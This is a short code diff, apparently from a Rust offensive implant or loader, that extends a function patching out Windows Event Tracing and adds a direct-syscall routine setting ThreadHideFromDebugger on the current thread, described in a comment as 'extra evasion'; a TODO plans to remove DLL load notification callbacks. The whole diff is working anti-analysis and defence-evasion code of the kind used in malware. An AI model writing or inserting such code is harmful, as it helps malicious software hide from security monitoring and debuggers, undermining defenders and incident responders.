@@ -30,6 +30,35 @@ pub unsafe fn patch_etw() -> bool {
         }
 
         debug!("[ETW] Hardware breakpints set: {}/2 - zero memory patches", patched);
+
+        // NtSetInformationThread(ThreadHideFromDebugger = 0x11) prevents the kernel from delivering debug even for this thread which add extra evasion
+        thread_hide_from_debugger();
+
         patched > 0
     }
 }
+
+
+unsafe fn thread_hide_from_debugger() {
+    let table = ssn_table::syscall_table();
+    let e = &table.ssns.nt_set_information_thread;
+    if e.ssn == 0 { return }
+
+    let current_thread: *mut core::ffi::c_void = -2isize as *mut core::ffi::c_void;
+    let status = crate::core::invoke::syscall4(
+        e.ssn, 
+        e.syscall_addr as usize, 
+        current_thread as usize, 
+        0x11,   // ThreadHideFromDebugger 
+        0,      // NULL (no buffer needed)
+        0,      // zero length
+    );
+
+    if status == 0 {
+        debug!("[ETW] ThreadHideFromDebugger set - thread hidden from debuggers")
+    } else {
+        debug!("[ETW] ThreadHideFromDebugger failed: 0x{:08X}", status)
+    }
+}
+
+// TODO: Remove DLL load notification callbacks
